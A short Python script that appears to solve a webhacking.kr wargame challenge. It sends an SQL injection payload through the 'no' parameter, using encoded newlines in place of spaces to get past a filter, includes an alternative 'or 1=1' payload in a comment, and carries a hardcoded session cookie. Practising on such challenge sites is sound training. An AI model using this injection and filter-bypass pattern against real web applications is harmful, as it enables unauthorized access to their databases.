import requests

url='http://webhacking.kr/challenge/web/web-32/index.php?no='
cookies={'PHPSESSID':'brieopfbm174l5pldrp06it4c5'}
get_param="9%0aor%0ano=2#" #get_param="9%0aor%0a1=1%0alimit%0a1,2"
url=url+get_param
print url
response=requests.post(url,cookies=cookies)
print response.text